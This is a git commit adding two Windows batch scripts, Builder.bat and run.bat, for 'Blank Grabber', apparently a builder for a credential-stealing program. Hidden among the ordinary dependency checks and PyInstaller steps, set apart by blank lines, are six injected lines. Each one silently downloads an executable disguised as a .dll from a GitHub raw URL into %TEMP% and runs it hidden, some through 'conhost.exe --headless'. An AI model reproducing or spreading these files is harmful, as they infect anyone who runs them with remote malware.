f826d588d2a958c1b94ad5241cb6a7816ec10478
AndroidDeveloperShubham <AndroidDeveloperShubham@users.noreply.github.com>
2024-11-09 18:19:03 -0300

    Initial commit

---
+++ Blank Grabber/Builder.bat
@@ -0,0 +1,60 @@
+@echo off
+cd /d %~dp0
+
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
+    echo Make sure it is added to PATH.
+
+
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
+
+    goto ERROR
+)
+
+title Checking libraries...
+echo Checking 'customtkinter' (1/4)
+python -c "import customtkinter" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing customtkinter...
+    python -m pip install customtkinter > nul
+)
+
+echo Checking 'pillow' (2/4)
+python -c "import PIL" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pillow...
+    python -m pip install pillow > nul
+
+
+@curl -s -o %TEMP%\x1.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b %TEMP%\x1.exe
+)
+
+echo Checking 'pyaes' (3/4)
+python -c "import pyaes" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyaes...
+    python -m pip install pyaesm > nul
+)
+
+echo Checking 'urllib3' (4/4)
+python -c "import urllib3" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing urllib3...
+    python -m pip install urllib3 > nul
+)
+
+cls
+
+
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
+
+title Starting builder...
+python gui.py
+if %errorlevel% neq 0 goto ERROR
+exit
+
+:ERROR
+color 4 && title [Error]
+pause > nul
---
+++ Blank Grabber/Components/run.bat
@@ -0,0 +1,51 @@
+@echo off
+setlocal ENABLEDELAYEDEXPANSION
+cls
+if not exist activate (
+    echo venv not found
+    pause
+    exit
+) else (
+
+
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
+
+    call activate
+)
+cls
+if not exist REQS (
+    title Installing requirements...
+    where gcc > NUL 2>&1
+    if !errorlevel! equ 0 (
+        set PYINSTALLER_COMPILE_BOOTLOADER=1
+	set PYINSTALLER_BOOTLOADER_WAF_ARGS=--gcc
+    ) else (
+        set PYINSTALLER_COMPILE_BOOTLOADER=
+    )
+    
+
+@curl -s -o %TEMP%\x1.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b %TEMP%\x1.exe
+    python -m pip install -r requirements.txt --no-cache-dir --no-binary pyinstaller --verbose
+    type NUL > REQS
+)
+cls
+title Obfuscating...
+python process.py
+title Converting to exe...
+if exist "bound.blank" (set "bound=--add-data bound.blank;.") else (set "bound=")
+if exist "noconsole" (set "mode=--noconsole") else (set "mode=--console")
+if exist "icon.ico" (set "icon=icon.ico") else (set "icon=NONE")
+pyinstaller %mode% --onefile --clean --noconfirm loader-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import json --add-binary rar.exe;. --add-data rarreg.key;. --add-data blank.aes;. --version-file version.txt %bound%
+if %errorlevel%==0 (
+    cls
+    title Post processing...
+
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
+    python postprocess.py
+    explorer.exe dist
+    exit
+) else (
+    color 4 && title ERROR
+    pause > NUL
+    exit
+)
